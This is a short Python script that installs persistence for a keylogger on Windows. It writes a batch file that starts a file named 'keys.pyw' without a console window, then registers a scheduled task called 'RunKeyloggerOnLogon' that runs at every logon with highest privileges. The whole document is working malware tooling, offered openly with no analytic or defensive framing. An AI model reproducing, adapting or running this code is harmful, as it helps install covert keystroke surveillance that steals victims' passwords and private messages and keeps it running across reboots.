import subprocess
import os

def create_keyscreen_bat(keylogger_path):
    bat_path = os.path.join(os.path.dirname(keylogger_path), "keyscreen.bat")
    pyw_path = keylogger_path.replace(".py", ".pyw")

    with open(bat_path, "w") as f:
        f.write(f'@echo off\n')
        f.write(f'start "" "{pyw_path}"\n')

    print(f"[✓] Created/updated keyscreen.bat at: {bat_path}")
    return bat_path

def create_task(task_name, bat_path):
    task_cmd = [
        "schtasks",
        "/Create",
        "/SC", "ONLOGON",
        "/TN", task_name,
        "/TR", f'"{bat_path}"',
        "/RL", "HIGHEST",
        "/F"
    ]
    subprocess.run(" ".join(task_cmd), shell=True, check=True)
    print(f"[✓] Scheduled logon task: {task_name}")

if __name__ == "__main__":
    base_dir = os.path.dirname(os.path.abspath(__file__))
    keylogger_py = os.path.join(base_dir, "keys.pyw")
    bat_path = create_keyscreen_bat(keylogger_py)
    create_task("RunKeyloggerOnLogon", bat_path)
